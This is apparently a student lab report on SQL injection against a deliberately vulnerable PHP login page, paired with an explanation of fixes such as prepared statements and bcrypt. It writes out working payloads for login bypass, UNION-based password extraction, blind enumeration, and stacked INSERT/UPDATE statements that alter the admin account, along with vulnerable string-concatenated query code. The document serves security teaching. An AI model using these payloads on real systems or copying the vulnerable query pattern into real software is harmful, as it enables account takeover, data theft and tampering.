# SECURITY.md — SQL Injection: Attack and Defense Analysis
**Lab 5 | System and Network Security (CS5.470) **

---

## 1. How SQL Injection Works

SQL Injection (SQLi) is a code injection technique in which an attacker inserts or "injects" malicious SQL code into an input field that is incorporated directly into a database query — without proper sanitization.

### Root Cause

When user input is concatenated directly into a query string, the database engine cannot distinguish between the developer's intended SQL logic and data supplied by the user. The attacker controls part of the SQL syntax itself.

**Vulnerable code (from `vulnerable_app/authentication.php`):**
```php
$username = $_POST['username'];   // raw input, no sanitization
$password = $_POST['password'];

$sql = "SELECT * FROM users WHERE username='$username' AND password='$password'";
```

**Normal query with valid input `user1 / pass1`:**
```sql
SELECT * FROM users WHERE username='user1' AND password='pass1'
```

**Injected query with `' OR '1'='1' --` as username:**
```sql
SELECT * FROM users WHERE username='' OR '1'='1' --' AND password=''
```

The `--` sequence starts a SQL comment, nullifying the password check. The condition `'1'='1'` is always true, so the query returns all rows regardless of the actual credentials.

---

## 2. Types of Attacks Performed

### 2.1 Authentication Bypass (Classic SQLi)

**Payload:**
```
Username: ' OR '1'='1' --
Password: (any)
```

**Injected Query:**
```sql
SELECT * FROM users WHERE username='' OR '1'='1' --' AND password=''
```

**Effect:** The tautology `'1'='1'` always evaluates to TRUE. MySQL returns every row in the users table. Since `mysqli_num_rows($result) > 0`, the application treats this as a successful login without any valid credentials.

---

### 2.2 Union-Based Injection (Data Extraction)

UNION-based injection appends a second SELECT statement to the original query, merging its results into the HTTP response.

**Payload:**
```
Username: ' UNION SELECT username, password FROM users --
Password: (any)
```

**Injected Query:**
```sql
SELECT * FROM users WHERE username='' 
UNION SELECT username, password FROM users --' AND password=''
```

**Effect:** The original SELECT returns 0 rows (empty username), but the UNION clause returns all rows from the users table. The application renders these rows directly on screen, exposing all usernames and passwords.

**Requirements for UNION injection:**
- Both SELECT statements must return the same number of columns.
- Data types in corresponding columns must be compatible.

---

### 2.3 Blind SQL Injection (Inference-Based)

Blind SQLi is used when the application does not echo query results to the page. The attacker injects conditions that produce different application behaviours (login success vs. failure) to infer data one bit at a time.

#### Boolean-Based Blind

**True condition (login succeeds — admin exists):**
```
Username: admin' AND '1'='1
Password: (any)
```
```sql
SELECT * FROM users WHERE username='admin' AND '1'='1' AND password='...'
```

**False condition (login fails):**
```
Username: admin' AND '1'='2
Password: (any)
```
```sql
SELECT * FROM users WHERE username='admin' AND '1'='2' AND password='...'
```

By varying the condition and observing the login outcome (success/failure), an attacker can enumerate password characters:

```sql
-- Does admin's password start with 'a'?
admin' AND SUBSTRING(password,1,1)='a' --
```

Repeating this across all positions and character values recovers the full password using at most `position × charset_size` requests.

---

### 2.4 Database Modification Attack (MANDATORY)

SQL is not limited to SELECT statements. With stacked queries (supported by some MySQL drivers and PDO with `PDO::MYSQL_ATTR_MULTI_STATEMENTS`) or by exploiting multi-statement execution, an attacker can run INSERT, UPDATE, or DELETE.

#### Insert a New User

**Payload:**
```
Username: '; INSERT INTO users VALUES('hacker','hacked123'); --
Password: (any)
```

**Injected query pair:**
```sql
SELECT * FROM users WHERE username=''; 
INSERT INTO users VALUES('hacker','hacked123'); --' AND password='...'
```

**Result:** A new user `hacker / hacked123` is inserted. Verified by running `SELECT * FROM lab5.users` in phpMyAdmin.

#### Change Admin Password

**Payload:**
```
Username: '; UPDATE users SET password='pwned' WHERE username='admin'; --
Password: (any)
```

**Injected query pair:**
```sql
SELECT * FROM users WHERE username=''; 
UPDATE users SET password='pwned' WHERE username='admin'; --' AND password='...'
```

**Result:** The admin account password is changed to `pwned`. Verified by logging in as `admin / pwned`.

> Screenshots of the table state BEFORE and AFTER each modification are in the `Screenshots/` folder.

---

## 3. How Attacks Modified the Database

| Attack             | Table Affected | Change Made                                |
|--------------------|----------------|--------------------------------------------|
| Insert User        | lab5.users     | New row `('hacker', 'hacked123')` added    |
| Change Password    | lab5.users     | admin's password column set to `'pwned'`   |

Both modifications persist across sessions and are visible in phpMyAdmin, demonstrating that SQL injection can cause permanent, destructive changes to a database — not just read data.

---

## 4. How the Fixes Prevent Every Attack

### Fix 1 — Prepared Statements (Parameterized Queries)

**Vulnerable code:**
```php
$sql = "SELECT * FROM users WHERE username='$username' AND password='$password'";
$result = mysqli_query($conn, $sql);
```

**Secure code:**
```php
$stmt = $pdo->prepare("SELECT username, password FROM users WHERE username = :username");
$stmt->execute([':username' => $username]);
$user = $stmt->fetch();
```

**Why it works:** The query structure (the SQL template) is compiled and sent to the database engine first, before any user data is bound. When user input arrives, the database treats it purely as a data value — never as executable SQL. No matter what the user types (e.g., `' OR '1'='1' --`), it becomes a literal string value that will never match a real username, so authentication fails. UNION payloads and stacked INSERT/UPDATE statements are also inert because the query template is already fixed.

---

### Fix 2 — Password Hashing

**Vulnerable app:** Passwords are stored and compared in plain text.

**Secure app:**
```php
// At registration / setup:
$hash = password_hash($password, PASSWORD_BCRYPT, ['cost' => 12]);

// At login:
if (!password_verify($password, $user['password'])) { /* fail */ }
```

**Why it works:**
- Even if an attacker extracts the `password` column via UNION injection, they see only bcrypt hashes like `$2y$12$...`, not the real passwords.
- bcrypt is a one-way function — computing the original password from the hash is computationally infeasible.
- The `cost` factor (12) means each hash attempt takes ~100ms, making brute-force attacks 100× slower than MD5.
- `password_verify()` is timing-safe, preventing timing-based side-channel attacks.

---

### Fix 3 — Input Validation

```php
// Reject non-alphanumeric usernames
if (!preg_match('/^[a-zA-Z0-9_]+$/', $username)) { redirect to error; }

// Reject overly long inputs
if (strlen($username) > 50 || strlen($password) > 100) { redirect to error; }
```

**Why it works:** SQL injection payloads always contain special characters (`'`, `-`, `;`, `=`, space). A strict alphanumeric whitelist rejects these at the application layer before any database interaction, adding a secondary layer of defense.

---

### Fix 4 — No Error Disclosure

**Vulnerable app:**
```php
die("Connection failed: " . mysqli_connect_error());   // exposes DB internals
echo "MySQL Error: " . mysqli_error($conn);            // exposes query structure
```

**Secure app:**
```php
error_log("DB Error: " . $e->getMessage());  // log server-side
die("A server error occurred.");             // generic message to user
```

**Why it works:** Attackers rely on verbose error messages to learn the table structure, column names, and SQL syntax needed to craft injections. Without error feedback, blind injection becomes much harder and more time-consuming.

---

### Fix 5 — Session Security

```php
session_regenerate_id(true);  // called immediately after successful login
```

**Why it works:** Regenerating the session ID after authentication prevents session fixation attacks, where an attacker pre-sets a known session ID before the victim logs in.

---

## 5. Defense-in-Depth Summary

```
Attack Surface         Vulnerable App          Secure App
──────────────────────────────────────────────────────────────
SQL Injection          String interpolation    Prepared statements
Password Storage       Plain text              bcrypt hash (cost=12)
Input Handling         None                    Whitelist regex + length limits
Error Handling         Full errors shown       Generic msg, server-side logging
Session Management     No regeneration         session_regenerate_id(true)
```

The secure application demonstrates that SQL injection is entirely preventable through correct engineering practices — no third-party framework or Web Application Firewall is required. The most important mitigation is parameterized queries, which structurally separate SQL code from data.
